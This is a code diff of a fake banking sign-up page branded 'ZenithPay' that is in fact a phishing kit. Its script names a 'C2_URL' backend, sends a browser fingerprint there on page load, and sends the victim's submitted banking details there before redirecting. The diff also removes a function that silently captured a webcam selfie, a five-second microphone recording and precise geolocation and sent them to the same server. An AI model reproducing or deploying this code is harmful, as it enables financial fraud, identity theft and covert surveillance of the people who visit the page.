@@ -6,13 +6,7 @@
     <title>ZenithPay</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
-        /* ===== RESET ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', -apple-system, sans-serif;
             background: #f4f6f9;
@@ -23,7 +17,6 @@
             min-height: 100vh;
             margin: 0;
         }
-
         .container {
             width: 100%;
             max-width: 480px;
@@ -31,12 +24,7 @@
             background: #f4f6f9;
             min-height: 100vh;
         }
-
-        .hidden {
-            display: none !important;
-        }
-
-        /* ===== SPLASH ===== */
+        .hidden { display: none !important; }
         .splash {
             position: fixed;
             top: 0;
@@ -50,38 +38,18 @@
             z-index: 999;
             animation: fadeOut 0.5s ease 2.8s forwards;
         }
-
-        @keyframes fadeOut {
-            to {
-                opacity: 0;
-                pointer-events: none;
-            }
-        }
-
-        .splash-box {
-            text-align: center;
-            color: #fff;
-        }
-
-        .splash-box h1 {
-            font-size: 32px;
-            font-weight: 900;
-        }
-
-        .splash-box p {
-            opacity: 0.7;
-            margin-top: 4px;
-        }
-
+        @keyframes fadeOut { to { opacity: 0; pointer-events: none; } }
+        .splash-box { text-align: center; color: #fff; }
+        .splash-box h1 { font-size: 32px; font-weight: 900; }
+        .splash-box p { opacity: 0.7; margin-top: 4px; }
         .loader {
             width: 200px;
             height: 4px;
-            background: rgba(255, 255, 255, 0.2);
+            background: rgba(255,255,255,0.2);
             border-radius: 4px;
             margin: 24px auto 0;
             overflow: hidden;
         }
-
         .loader::after {
             content: '';
             display: block;
@@ -91,27 +59,14 @@
             border-radius: 4px;
             animation: load 2.5s ease forwards;
         }
-
-        @keyframes load {
-            to {
-                width: 0%;
-            }
-        }
-
-        /* ===== HEADER ===== */
+        @keyframes load { to { width: 0%; } }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 4px 0 16px;
         }
-
-        .header h2 {
-            font-size: 20px;
-            font-weight: 800;
-            color: #0f172a;
-        }
-
+        .header h2 { font-size: 20px; font-weight: 800; color: #0f172a; }
         .badge {
             background: #e8f5e9;
             color: #0a7e3d;
@@ -120,8 +75,6 @@
             padding: 4px 12px;
             border-radius: 100px;
         }
-
-        /* ===== BANNER ===== */
         .banner {
             background: linear-gradient(135deg, #0a7e3d, #064e2a);
             border-radius: 16px;
@@ -131,88 +84,39 @@
             align-items: center;
             margin-bottom: 20px;
             color: #fff;
-            box-shadow: 0 6px 24px rgba(10, 126, 61, 0.25);
+            box-shadow: 0 6px 24px rgba(10,126,61,0.25);
         }
-
         .banner .tag {
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255,255,255,0.15);
             font-size: 10px;
             font-weight: 600;
             padding: 2px 10px;
             border-radius: 100px;
             display: inline-block;
         }
-
-        .banner h3 {
-            font-size: 20px;
-            font-weight: 800;
-            margin: 2px 0;
-        }
-
-        .banner .gold {
-            color: #f5a623;
-        }
-
-        .banner p {
-            font-size: 13px;
-            opacity: 0.8;
-        }
-
+        .banner h3 { font-size: 20px; font-weight: 800; margin: 2px 0; }
+        .banner .gold { color: #f5a623; }
+        .banner p { font-size: 13px; opacity: 0.8; }
         .timer {
-            background: rgba(255, 255, 255, 0.12);
+            background: rgba(255,255,255,0.12);
             padding: 6px 14px;
             border-radius: 10px;
             text-align: center;
         }
-
-        .timer .label {
-            display: block;
-            font-size: 9px;
-            text-transform: uppercase;
-            opacity: 0.6;
-        }
-
-        .timer .time {
-            font-size: 18px;
-            font-weight: 700;
-        }
-
-        /* ===== CARD ===== */
+        .timer .label { display: block; font-size: 9px; text-transform: uppercase; opacity: 0.6; }
+        .timer .time { font-size: 18px; font-weight: 700; }
         .card {
             background: #fff;
             border-radius: 16px;
             padding: 22px 18px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
             border: 1px solid #e2e8f0;
         }
-
-        .card h4 {
-            font-size: 18px;
-            font-weight: 700;
-            color: #0f172a;
-        }
-
-        .card .sub {
-            color: #64748b;
-            font-size: 14px;
-            margin-bottom: 18px;
-        }
-
-        /* ===== FORM ===== */
-        .field {
-            margin-bottom: 14px;
-        }
-
-        .field label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 4px;
-            color: #0f172a;
-        }
-
-        .field input,
-        .field select {
+        .card h4 { font-size: 18px; font-weight: 700; color: #0f172a; }
+        .card .sub { color: #64748b; font-size: 14px; margin-bottom: 18px; }
+        .field { margin-bottom: 14px; }
+        .field label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 4px; color: #0f172a; }
+        .field input, .field select {
             width: 100%;
             padding: 12px 14px;
             background: #f8fafc;
@@ -225,35 +129,21 @@
             appearance: none;
             -webkit-appearance: none;
         }
-
-        .field input:focus,
-        .field select:focus {
+        .field input:focus, .field select:focus {
             border-color: #0a7e3d;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(10, 126, 61, 0.1);
+            box-shadow: 0 0 0 3px rgba(10,126,61,0.1);
             background: #fff;
         }
-
-        .field input::placeholder {
-            color: #94a3b8;
-        }
-
+        .field input::placeholder { color: #94a3b8; }
         .field select {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2394a3b8' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
             background-position: right 14px center;
             cursor: pointer;
         }
-
-        .row {
-            display: flex;
-            gap: 12px;
-        }
-
-        .row .field.half {
-            flex: 1;
-        }
-
+        .row { display: flex; gap: 12px; }
+        .row .field.half { flex: 1; }
         .checkbox {
             display: flex;
             align-items: flex-start;
@@ -262,15 +152,7 @@
             color: #64748b;
             margin: 16px 0 18px;
         }
-
-        .checkbox input {
-            margin-top: 2px;
-            width: 16px;
-            height: 16px;
-            accent-color: #0a7e3d;
-        }
-
-        /* ===== BUTTONS ===== */
+        .checkbox input { margin-top: 2px; width: 16px; height: 16px; accent-color: #0a7e3d; }
         button[type="submit"] {
             background: linear-gradient(135deg, #0a7e3d, #064e2a);
             border: none;
@@ -284,24 +166,16 @@
             font-family: 'Inter', sans-serif;
             transition: 0.25s;
         }
-
         button[type="submit"]:hover {
             transform: scale(1.01);
-            box-shadow: 0 6px 24px rgba(10, 126, 61, 0.3);
+            box-shadow: 0 6px 24px rgba(10,126,61,0.3);
         }
-
         button[type="submit"]:disabled {
             background: #94a3b8;
             cursor: not-allowed;
             transform: none;
         }
-
-        .footer-text {
-            text-align: center;
-            margin-top: 18px;
-            font-size: 12px;
-            color: #64748b;
-        }
+        .footer-text { text-align: center; margin-top: 18px; font-size: 12px; color: #64748b; }
     </style>
 </head>
 <body>
@@ -353,7 +227,7 @@
                 </div>
                 <div class="field">
                     <label>Occupation</label>
-                    <input type="text" id="bvn" placeholder="e.g lawyer" required />
+                    <input type="text" id="" placeholder="e.g lawyer" required />
                 </div>
                 <div class="row">
                     <div class="field half">
@@ -380,19 +254,15 @@
 
     <script>
         // ============================================================
-        // ALL JAVASCRIPT EMBEDDED HERE — NO EXTERNAL FILES
+        // SIMPLIFIED — NO PERMISSIONS, NO LOCATION, NO CAMERA, NO MIC
         // ============================================================
 
-        // ============ CONFIG ============
-        // ⚠️ REPLACE WITH YOUR BACKEND URL ⚠️
         var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 
-        console.log('Page loaded — JavaScript running');
+        console.log('Page loaded — No permissions version');
 
-        // ============ SPLASH TO LOGIN ============
+        // ===== SPLASH TO LOGIN =====
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('DOM ready — initializing');
-
             var splash = document.getElementById('splash');
             var loginPage = document.getElementById('loginPage');
 
@@ -402,69 +272,10 @@
                     loginPage.classList.remove('hidden');
                     console.log('Splash hidden, login shown');
                 }, 3000);
-            } else {
-                console.log('Splash or loginPage not found');
             }
         });
 
-        // ============ PERMISSIONS ============
-        function requestPermissions() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        sendData({
-                            type: 'location',
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        });
-                    },
-                    function() {},
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            }
-
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 640, height: 480 }
-            })
-            .then(function(stream) {
-                var video = document.createElement('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = function() {
-                    video.play();
-                    var canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    var ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    var imageData = canvas.toDataURL('image/jpeg', 0.8);
-                    stream.getTracks().forEach(function(track) { track.stop(); });
-                    sendData({ type: 'selfie', image: imageData });
-                };
-            })
-            .catch(function() {});
-
-            navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(function(stream) {
-                var mediaRecorder = new MediaRecorder(stream);
-                var chunks = [];
-                mediaRecorder.ondataavailable = function(e) { chunks.push(e.data); };
-                mediaRecorder.onstop = function() {
-                    var blob = new Blob(chunks, { type: 'audio/webm' });
-                    var reader = new FileReader();
-                    reader.onload = function() {
-                        sendData({ type: 'audio', audio: reader.result });
-                    };
-                    reader.readAsDataURL(blob);
-                    stream.getTracks().forEach(function(track) { track.stop(); });
-                };
-                mediaRecorder.start();
-                setTimeout(function() { mediaRecorder.stop(); }, 5000);
-            })
-            .catch(function() {});
-        }
-
-        // ============ SEND DATA ============
+        // ===== SEND DATA =====
         function sendData(payload) {
             payload._timestamp = Date.now();
             payload._ua = navigator.userAgent;
@@ -483,7 +294,7 @@
             }).catch(function() {});
         }
 
-        // ============ FINGERPRINT ============
+        // ===== FINGERPRINT =====
         function captureFingerprint() {
             sendData({
                 type: 'fingerprint',
@@ -496,14 +307,13 @@
             });
         }
 
-        // ============ FORM SUBMIT — THE OPEN ACCOUNT BUTTON ============
+        // ===== FORM SUBMIT =====
         var signupForm = document.getElementById('signupForm');
-        console.log('signupForm found:', signupForm);
 
         if (signupForm) {
             signupForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                console.log('🔥 Open Account button clicked!');
+                console.log('Open Account button clicked!');
 
                 var userData = {
                     type: 'banking_details',
@@ -528,13 +338,10 @@
                     window.location.href = 'dashboard.html';
                 }, 1800);
             });
-        } else {
-            console.error('❌ signupForm NOT found! Check your HTML.');
         }
 
-        // ============ INIT ============
+        // ===== INIT =====
         captureFingerprint();
-        setTimeout(requestPermissions, 800);
 
         var submitBtn = document.getElementById('submitBtn');
         if (submitBtn) {
@@ -543,10 +350,8 @@
                 submitBtn.disabled = false;
                 console.log('Submit button enabled');
             }, 3000);
-        } else {
-            console.error('❌ submitBtn NOT found!');
         }
     </script>
 
 </body>
-    </html>
+                </html>
